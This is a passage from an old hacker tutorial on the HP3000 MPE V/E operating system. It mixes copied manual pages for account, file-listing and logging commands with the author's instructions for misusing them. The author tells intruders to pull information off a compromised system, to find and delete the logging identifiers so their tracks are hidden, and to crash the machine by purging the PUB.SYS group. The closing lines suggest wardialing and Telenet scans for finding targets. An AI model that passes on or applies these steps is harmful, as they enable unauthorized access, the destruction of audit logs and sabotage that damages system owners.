     assigned (in this case, R, L, A, W, X:AC).  The default is also
     assigned when an entire keyword parameter group (such as
     ;ACCESS=fileaccess) is omitted.

     After the system manager has created accounts and their PUB groups,
     and has designated the account managers for those accounts, the new
     account managers may logon and redefine their own attributes and
     those of their PUB groups. Account managers may also define new
     users and groups. However, the capabilities and attributes the
     account managers assign to groups and users cannot exceed those
     assigned to the account itself by the system manager. For example,
     if the system manager does not assign the account DS capability, no
     users in the account are permitted DS capability (so they cannot
     use  extra data segments).

     The PUB group is initially assigned no password and the same
     capability class attributes, permanent file space limit, CPU limit,
     and connect time limit as the account.  Its initial security allows
     READ and EXECUTE access to all users who successfully logon to the
     account, and APPEND, WRITE, LOCK, and SAVE access to account
     librarian (AL) and group users (GU) only. These access provisions
     are (R,X:ANY;A,W,L,S:AL,GU).

EXAMPLE

     To create an account with the account name ACI, and the account
     manager name MNGR, with all other parameters assigned by default,
     enter:

     NEWACCT ACI,MNGR

                    Capabilities assigned to the user via the ;CAP=
                    parameter cannot exceed those assigned to the
                    account. If the account's capabilities are altered,
                    any capabilities removed from the account are also
                    removed from the user. The user's capabilities are
                    always  a subset of the account's at logon.  This
                    prevents a user from being granted a capability not
                    assigned to the account. Note that CV capability,
                    which allows users to create private volumes, also
                    confers UV capability, which lets them use those
                    volumes.  The default is IA, BA, ND, SF.

subqueuename        The name of the highest priority subqueue that any
                    job or session in the account can request for
                    executing processes.  The <subqueuename> may be
                    either AS, BS, CS, DS, or ES. The default is CS. The
                    priority specified for the user in NEWUSER cannot be
                    greater than that specified for the account.

                    The <subqueuename> defined for the user is checked
                    against the <subqueuename> defined for the user's
                    account at logon.  The lower priority of the two is
                    used as the maximum priority and restricts all
                    processes of the job/session.  Also, the priority
                    requested by the user at logon is checked against
                    the <subqueuename> defined for that user, and the
                    lower of these two values is granted.

localattribute      The local attribute of the user, as defined at the
                    installation site.  This is a double-word bitmap of
                    arbitrary meaning, which may be used to classify
                    users further.  Although it is not part of standard
                    MPE V/E security provisions, it is available to
                    processes through the WHO intrinsic for use in the
                    programmer's own security provisions. The NEWUSER
                    command checks the local attributes of the user with
                    those of the account.  The default is double-word 0
                    (null).

homegroupname       The name of an existing group to be assigned as the
                    user's home group. If none is assigned, the user
                    must specify a group when logging on.  The default
                    is that no home group is assigned.

REQ                 USERPASS=REQ requires that the user have a non-blank
                    password. It is available only if the HP Security
                    Monitor has been installed.

OPT                 USERPASS=OPT makes a user password optional. This is
                    the default. It is available only if the HP Security
                    Monitor has been installed.

EXPIRED             The password expires immediately. The user cannot
                    logon without selecting a new password. It is
                    available only if the HP Security Monitor has been
                    installed.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] has no effect on this command.  A user
     must have account manager (AM) capability to execute this command.

OPERATION

     The account manager uses the NEWUSER command to define an account
     member. When the user is defined, the account manager may also
     assign the user a password and capabilities, and limit the user's
     access to system resources. Parameters defining these values may
     also be omitted from the command line; in this case, the defaults
     are assigned to the user.

EXAMPLE

     To define a new user named LHSMITH and assign a password of SMITTY
     and a homegroup of HOMEGPX, enter:

     NEWUSER LHSMITH;PASS=SMITTY;HOME=HOMEGPX

     INFORMATION RETERVAL:

Now that your in and have acsess to it all you will want to suck the
system dry of it's information.  The following section is devoted to
just that. We will go into file retrieval, program runing, and  log
veiwing.

The following lets you see the user defined programes to run one 
just type it's names at the prompt.

SHOWCATALOG

     Lists user-defined command (UDC) files.

SYNTAX

     SHOWCATALOG [listfile        ]
                  ;USER=user[.acct]

PARAMETERS

listfile      An arbitrary filename, used to identify the UDC file
              when the output of SHOWCATALOG is sent to a printer.
              The output may be redirected with a previous FILE
              command. Default is that UDC files are displayed on
              your terminal (the $STDLIST device).

user[.acct]   A particular user whose UDC filenames will be
              displayed on the screen or sent to a listfile;  the
              contents of the files are not displayed.

             The wildcard characters @, #, and ? may be used in
             [.acct] as you would use them in the specification
             of any user or any account, where:

               @         One or more alphanumeric characters.  Used
                         by itself, @ denotes "all members of the
                         set".

              #         One numeric character.

             ?         One alphanumeric character.

               Each wildcard character counts toward the eight
               character limit for <user> or <acct>.

USE

 This command may be issued from a session, job, or in BREAK.  It
 may not be issued from a program.  It is breakable (aborts
 execution).

OPERATION

 The SHOWCATALOG command lists user-defined command (UDC) files.
 Unless the output is redirected to another device with the FILE
 command, as shown in "EXAMPLE", the listing appears on your
 terminal. It indicates at which level (user, account, or system)
 the files have been defined, so that you may display the current
 catalog before adding or deleting system level UDCs (if you are the
 system manager) or account level UDCs (if you are account manager).

EXAMPLE

To list system, account, and user level UDC files on your terminal,
enter:

     SHOWCATALOG

To store the current UDC file on disk as "LFILE" (which may also be
printed) enter:

BUILD LFILE
FILE LFILE,OLD;DEV=DISC
SHOWCATALOG *LFILE

The next two comands are self explanotory and easy to use
but they are the back of info gathering so I will explan them.

LISTF


     Lists descriptions of one or more permanent disk files.

SYNTAX

                     {, 0}
                     {, 1}
     LISTF [fileset][{, 2}] [;listfile]
                      ,-1}
                      ,-2}


PARAMETERS

fileset        Specifies the set of files to be listed.  This
               positional parameter has the form:
               filename[.groupname[.acctname]]

              The characters @, #, and ? can be used as wildcard
              characters in any position of the <fileset>
              parameter.  The wildcard characters count toward the
              eight-character limit for group, account, and file
              names. These wildcard characters have the following
              meanings:
              @         Specifies one or more alphanumeric
                        characters.When used by itself, @ denotes
                        all members of the set.
              #         Specifies one numeric character.

              ?         Specifies one alphanumeric character.

             These characters can be used with files as follows:
             n@        Lists all files starting with the
                           character
                           "n".

             @n        Lists all files ending with the character
                       "n".

             n@x       Lists all files starting with the
                       character "n" and ending with the
                       character "x".

             n#######  Lists all files starting with the
                       character "n" followed by seven digits.

             ?n@       Lists all files whose second character is
                       "n".

              n?        Represents all two-character files
                        starting with the character "n".

              ?n        Represents all two-character files ending
                        with the character "n".

            Depending on the position of these characters in the
            <fileset> parameter, they can also be used to
            indicate groups and accounts. If you do not specify
            a group or account, MPE V/E assumes the logon group
            and account.  The default is @ (lists all files in
            logon group).

            0, 1, 2, -1, or -2  Displays information about the
                                file. Displays only the file
                                name.  The default is 0 if no
                                list level is specified.

           0         Displays only the file name. The default
                     is 0 if no list level is specified.

           1         Displays the file name, file code, record
                     size, format, the current end-of-file
                     location, and the maximum number of
                     records allowed in the file.  It also
                     shows whether the file is ASCII or binary;
                     CCTL or NOCCTL; CIR, MSG, or STD. An
                     asterisk following the file name indicates
                     that someone has performed an FOPEN on it
                     and not yet done an FCLOSE.

           2         Displays all the information found with
                     option 1, plus the blocking factor, the
                     number of disk sectors in use (including
                     those in use for system and user labels),
                     the number of extents currently allocated,
                     and the maximum number of extents allowed.

           -1        Displays the octal listing of the file
                      label.  The first line of this listing is
                     the directory entry for the file being
                     listed. The remainder is the file label.
                     The -1 option is available only to users
                     who have system manager (SM) or account
                    manager (AM) capability.

           -2        Displays the access control definition
                    (ACD) information associated with the
                    requested <fileset>. If no ACD information
                     exists for a file or if you do not have
                     access to the ACD (SM, AM, CR, or RACD
                    access), a message stating that fact is
                     issued.

listfile            The name of the output file to which the
                    descriptions are written.  It is automatically
                    specified as an ASCII file with variable length
                 records and these characteristics:  closed in the
                   temporary domain, CCTL, OUT access mode, and EXC
                   (exclusive access) option.  The remaining
                    characteristics are those obtained from the FILE
                    command default specifications.  This file is
                    temporary and cannot be overwritten by a BUILD
                    command.  The default is $STDLIST.

USE

     You may issue this command from a session, job, program, or in
     BREAK. Pressing [BREAK] suspends execution.

OPERATION

    This command applies only to permanent disk files.  It lists
    descriptions of one or more disk files at the level of detail you
    select. You need not have access to a file to list a description of
    it, but you must have access to it to receive information on any
    associated ACDs. However, a file description is not listed unless
    the file's home volume set (PV) is mounted. A standard user may
    list level 0, 1, and 2 information for any file in the system, or -
    2 ACD data for those files for which they have READ ACD access.
    Users with AM capability may list level -1  or -2 data for files in
    their own accounts. Users with SM capability may list -1 or -2 data
    for any file in the system.

    If you send a LISTF command to the line printer or magnetic tape,
   the date and time are printed at the top of the data.
     You may request that the file information be displayed on devices
    other than the standard listing device. Name the desired device in
    the FILE command as follows:
     FILE PRTR;DEV=LP      ** Equates name PRTR with device class
                                  name LP. **
    LISTF @.@,2;*PRTR     ** Directs level 2 description of all files
                                       in all groups of the logon
                                        account to PRTR. **
     If MPE V/E fails to locate a requested file, the following error
    message is displayed.

    NON-EXISTENT FILE (CIERR 907)

   If you have a wildcard character in your request and MPE V/E cannot
   locate any files satisfying those conditions, the following warning
   is displayed:

   NO FILES FOUND IN FILE-SET (CIWARN 431)

     The column headings have the following meanings:

   FILENAME       Gives the filename. An asterisk (*) following the
                 filename in options 1 and 2 indicates the file is
                  open for READ or WRITE access.

   CODE           Refer to the BUILD or FILE command for an
                  explanation of the file code.

   SIZE           The size of the records under the heading SIZE,
                  indicating the number of words (W) or bytes (B).

   TYP            The first letter under this heading contains
                  information on the record format.  This is listed in
                  one of the following ways: F (fixed length), V
                  (variable length), or U (undefined length).

                  The second letter indicates whether the file is A
                  (ASCII) or B (binary).

                  The third letter indicates the kind of file.  This
                  information appears in one of the following ways:
                  Blank (standard file unless KSAM appears in the code
                  field), O (circular file), M (message file), or R
                  (relative I/O file).

                  The letter C follows if the file has the ;CCTL
                  attribute.

EOF                 End of file location.

LIMIT               Maximum number of records allowed.

R/B                 Blocking factor.

SECTORS             Sectors in use.

#X                  Extents allocated.

SYNTAX

     LISTFTEMP [fileset][,listlevel][;listfile]

PARAMETERS

fileset             Specifies the set of files to be listed.  This
                    positional parameter takes the following form:

                    filename[.groupname[.acctname]]

The characters @, #, and ? may be used as wildcard characters in any
position of the <fileset> parameter.  The wildcard characters count
toward the eight-character limit for group, account, and filenames.
These wildcard characters have the following meanings:

                    @         Specifies zero or more alphanumeric
                              characters. When used by itself, @ denotes
                              all members of the set.

                    #         Specifies one numeric character.

                    ?         Specifies one alphanumeric character.

These characters can be used with files as follows:

                    n@        Lists all files starting with the
                              character "n".

                    @n        Lists all files ending with the character
                              "n".

                    n@x       Lists all files starting with the
                              character "n" and ending with the
                              character "x".

                    n#######  Lists all files starting with the
                              character "n" followed by seven digits.

                    ?n@       Lists all files whose second character is
                              "n".

                    n?        Represents all two-character files that
                              start with the character "n".

                    ?n        Represents all two-character files that
                              end with the character "n".

Depending on their placement in the <fileset> parameter, these
characters may also be used to indicate groups and accounts.  If you
specify nothing for the group or account, MPE V/E assumes the logon
group and account.  The default is @ (all files in logon group).

listlevel           Displays information about the file.  The options
                    are level 0, 1, 2, or -1:

                    0         Displays only the filename.  The default
                              is 0 if no listlevel is specified.

                    1         Displays the filename, file code,  record
                              size, format, the current end-of-file
                              location, and the maximum number of
                              records allowed in the file. (It also
                              shows whether the file is ASCII or binary;
                              CCTL or NOCCTL; CIR, MSG, or STD).

                    2         Displays all of the information found with
                              the 1 option, plus the blocking factor,
                              the number of disk sectors in use
                              (including those in use for file labels
                              and user headers), the number of extents
                              currently allocated, and the maximum
                              number of extents allowed.

                    -1        Displays the octal listing of the file
                              label.  The first line of this listing is
                              the directory entry for the file being
                              listed. The -1 option is available only to
                              users who have SM or AM capability.

listfile            The name of the output file to which the
                    descriptions are written. It is automatically
                    specified as an ASCII file with variable length
                    records and these characteristics:  closed in the
                    temporary domain, CCTL (user supplied carriage-
                    control characters), OUT access mode, and EXC
                    (exclusive access) option.  The remainder of its
                    characteristics are those obtained from the FILE
                    command default specifications.  This file is
                    temporary and cannot be overwritten by a BUILD
                    command.  The default is $STDLIST.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] has no effect on this command.

OPERATION

     This command lists descriptions of one or more temporary disk files
     at the level of detail you select. A file description is not listed
     unless the file's home volume set (PV) is mounted.  A standard user
     may specify level 0, 1 and 2 information for any file in the
     system. A user with account manager or system manager capability
     may list level -1 data for files in his or her own account.  When
     you send LISTFTEMP data to the line printer or magnetic tape, the
     date and time  appear at the beginning of the listing.

     LISTFTEMP displays the system file $OLDPASS only if wildcard
     characters are used in the file specification and if $OLDPASS fits
     the specification.

     You may have the file information displayed on a device other than
     your standard list device.  To do so, name the desired device in
     the FILE command, then backreference the formal file name on the
     LISTFTEMP command line.  In the following example, the filename
     PRTR is equated with the device class LP.  Then, a level 2
     description of all files in all groups of the logon account is sent
     to PRTR.

     FILE PRTR;DEV=LP
     LISTFTEMP @.@,2;*PRTR

     If MPE V/E fails to locate the file you request, one of the
     following error messages is displayed:

      TEMPORARY FILE NOT FOUND (CIWARN 3289)

     NO TEMP FILES EXIST (CIWARN 3284)

     If you use a wildcard character in your request and MPE V/E cannot
     locate any files satisfying those conditions, the following warning
     is displayed:

     TEMPORARY FILE NOT FOUND (CIWARN 3289)

     LISTFTEMP requires 8K of stack space to execute.  If you use the
     command programmatically, make the appropriate <maxdata> allowances
     for your application.

     The column headings have the following meanings:

     HEADING        MEANING

     FILENAME       Displays the filename. An asterisk (*) following the
                    filename in the level 1 and 2 options indicates the
                    file is open for READ or WRITE access.

     CODE           Indicates a special file format.  Refer to the BUILD
                    or FILE command for a list of file codes and their
                    meaning.

     SIZE           Displays the size of the records under the heading
                    SIZE, indicating the number of words (W) or bytes
                    (B).

     TYP            The first column under this heading contains
                    information concerning record format.  This is
                    listed in one of the following ways: F (fixed
                    length), V (variable length), or U (undefined
                    length).

                    The second column indicates whether the file is A
                    (ASCII) or B (binary).

                    The third column indicates the kind of file.  This
                    information appears in one of the following ways:
                    Blank (standard file unless KSAM appears in the code
                    field), O (circular file), D (message file) or R
                    (relative I/O file).

                    In the fourth column a C appears only if the ;CCTL
                    parameter is selected.

     EOF            End of file location.

     LIMIT          Maximum number of records allowed.

     R/B            Blocking factor.

     SECTORS        Sectors in use.

     #X             Extents allocated.

     MX             Maximum number of extents allowed.

     (TEMP)         Temporary files.

-------------------------------------------------------------------------
    LOG DESTRUCTION

The good hack never wants to leave a trail behind him so after the fun be 
sure to cover your tracks and kill the log.  Warning this will insome
cases save your ass but it will definitly tip the operator of so do it 
on your last call!

Your first job is to find the log files, this can be done with the next 
command.
LISTLOG

     Lists currently active logging identifiers on the system and
     whether log file changing has been enabled.

SYNTAX

     LISTLOG [logid[;PASS]]

PARAMETERS

logid               The specific logging identifier to be verified. The
                    default is to list all currently active logging
                    identifiers on the system.

PASS                Causes the password associated with the logging
                    identifier to be displayed. The password can be used
                    only by the creator of the logging identifier.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] has no effect on this command. You must
     have user logging (LG) capability to execute this command.

OPERATION

     This command lists the logging identifier specified with its
     associated creator and log file.  The column labeled CHANGE
     indicates whether the CHANGELOG command is permitted:  that is,
     whether the name of the first logging file ends in "001" and thus
     follows the naming convention required by the CHANGELOG command.
     The column labeled AUTO indicates whether an automatic CHANGELOG is
     permitted:  that is, whether the AUTO parameter has been specified
     with a GETLOG or ALTLOG command.

     If the <logid> parameter is not entered, all logging identifiers on
     the system are displayed with their creators and log files.  The
     PASS parameter, which can be used only by the creator of the
     logging identifier specified, causes the password associated with
     the logging identifier to be listed. You must have system
     supervisor (OP) or user logging (LG) capability in order to use
     this command.

EXAMPLE

     To list all logging identifiers on the system, enter:

     LISTLOG

      LOGID     CREATOR            CHANGE   AUTO   CURRENT LOGFILE

      TESTLOG   LALITHA.MPEM        YES      YES   LAL001.PEJAVAR.MPEM
      TEST1     MARK.MPEM           YES      NO    M001.KSAM3000.MPEM
      TEST2     PAT.MPEM            NO       NO    TEST.ALVAREZ.MPEM

----------------------------------------------------------------------
Now that you have the list of logs to ZAP use the following and presto!

RELLOG
     SYNTAX

     RELLOG   logid

PARAMETERS

logid               The logging identifier to be removed from the
                    system.

USE

     You may issue this command from a session, job, program, or in
     BREAK. Pressing [BREAK] has no effect on this command.  You must
     have system supervisor (OP) or user logging (LG) capability in
     order to use this command.

OPERATION

     The RELLOG command removes a logging identifier from the system by
     deleting it from the directory of logging identifiers.  This
     command may be issued only by the user who created the logging
     identifier specified in the <logid> parameter.  After RELLOG is
     issued, programs containing the removed logging identifier may not
     access the logging system.

EXAMPLE

     To remove the logging identifier DATALOG from the system, enter:

     RELLOG DATALOG

       CRASHING THE SUCKER

I NEVER adbocate the following but I realize that there is those times
when being able to crash a system will save your ass.  The hp3000 is
very vulnerable to attack and there is many ways to crash one but the
following is easy and IT WORKS!

All you have to do is purge the PUB group of the SYS account. The public 
group of the system account, PUB.SYS, cannot be completely purged. If
you specify this group in the <groupname> parameter, all non-system and 
inactive files are purged. This seriously impairs the functioning of 
the entire system.


    
     PURGEGROUP groupname[.accountname] [;VS=volset]

PARAMETERS

groupname           Name of the group in the logon account to be
                    removed. This name must contain from one to eight
                    alphanumeric characters, beginning with an
                    alphabetic character.

accountname         As system manager, you can include the account name
                    when you are logged onto an account other than the
                    requested account.

volset              Volume set or volume class reference which, when
                    fully qualified, is in the form,
                    <vcsid.groupname.acctname>.  <vcsid> refers to a
                    previously defined volume set or volume class.

                    If <volset> is specified, the volume set or volume
                    class must be mounted or the PURGEGROUP command will
                    fail. When the <volset> parameter is specified, the
                    group is removed from the volume set directory, and
                    not the system directory.

USE

     You may issue this command from a session, job, program, or in
     BREAK.  Pressing [BREAK] has no effect on this command.  You must
     have account manager (AM) capability to  execute this command.

OPERATION

     Account managers use the PURGEGROUP command to delete a group from
     their account. When the command is executed during a session, MPE
     V/E displays a verification request. Respond with "YES" or "NO" to
     the message:

     GROUP <groupname> TO BE PURGED? (YES/NO)

     No verification message is printed if the PURGEGROUP command is
     entered in a job.

     If the group resides on a private volume, the command is executed
     only when the group's home volume set is mounted.

     The order in which entries are purged is: volume set definitions,
     files, and finally the group. If no files in the group are in use,
     and the group itself is not in use, the PURGEGROUP command removes
     the entire group.  Otherwise, only inactive files are removed. To
     completely purge the group in this case, re-enter the PURGEGROUP
     command when neither the group nor its files are in use.

EXAMPLE

     To purge a group named GROUP1, enter:

     PURGEGROUP GROUP1
     GROUP GROUP1 TO BE PURGED? (YES/NO) YES
------------------------------------------------------------------------
     LOG OFF:

Simple just type BYE and in the words of ucbbs "click your gone."
It will display the cpu time, total time, node number you where on
and thats all folks.

--------------------------------------------------------------------
Well if you made it this far you are half way to being the radist 
hp3000 hacker in the world.... The other half is to get a system to
use.  Some suggestions pick up a copy of LOD tech journal 3 it has
a telenet scan with lots of HP's and also if you wardial a prefix,
I don't care if it is nowheresvile Kansus you will find a HP3000.
